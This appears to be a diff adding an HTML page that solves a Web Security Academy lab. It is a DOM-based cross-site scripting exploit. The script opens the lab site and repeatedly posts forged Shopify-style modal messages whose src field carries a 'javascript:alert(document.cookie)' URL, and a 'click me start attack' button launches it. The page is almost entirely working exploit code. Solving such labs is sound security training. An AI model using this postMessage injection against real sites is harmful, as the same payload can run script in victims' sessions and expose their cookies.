@@ -1,0 +1,24 @@
+<script>
+    function attack(){
+        const ctx = window.open('https://ac271fef1f79f7ae80b37be7004800e7.web-security-academy.net')
+        const json = {
+            message: "Shopify.API.Modal.initialize",
+            data: {
+                src: ""
+            }
+        }
+
+        let interval;
+        interval = setInterval(function(){
+            if (window.attackSuccess) {
+                clearInterval(interval)
+            } else {
+                ctx.postMessage(JSON.stringify(json)) // data.src == ""
+                json.data.src = "javascript:alert(document.cookie)//http:"
+                ctx.postMessage(JSON.stringify(json))
+            }
+        }, 500)
+    }
+    attack()
+</script>
+<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
